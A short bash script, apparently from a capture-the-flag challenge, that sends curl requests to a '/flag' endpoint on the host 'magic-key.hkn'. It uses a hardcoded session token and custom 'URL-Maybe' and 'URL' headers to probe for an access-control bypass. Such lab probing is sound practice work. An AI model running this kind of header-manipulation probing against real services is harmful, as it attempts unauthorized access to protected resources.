#!/bin/bash
TARGET="magic-key.hkn"
TOKEN="very-good-session-token"

echo "### /flag with Session-Token: $TOKEN + URL-Maybe: /flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/flag" \
    -H "Session-Token: $TOKEN" \
    -H "URL-Maybe: /flag"
echo ""; echo "---"

echo "### /flag with Session-Token: $TOKEN + URL: /flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/flag" \
    -H "Session-Token: $TOKEN" \
    -H "URL: /flag"
echo ""; echo "---"

echo "### /next_chars?char=s with Session-Token: $TOKEN + URL-Maybe: /flag ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/next_chars?char=s" \
    -H "Session-Token: $TOKEN" \
    -H "URL-Maybe: /flag"
echo ""; echo "---"

echo "### /flag with Session-Token: $TOKEN alone (no path header) ###"
curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/flag" \
    -H "Session-Token: $TOKEN"
echo ""; echo "---"
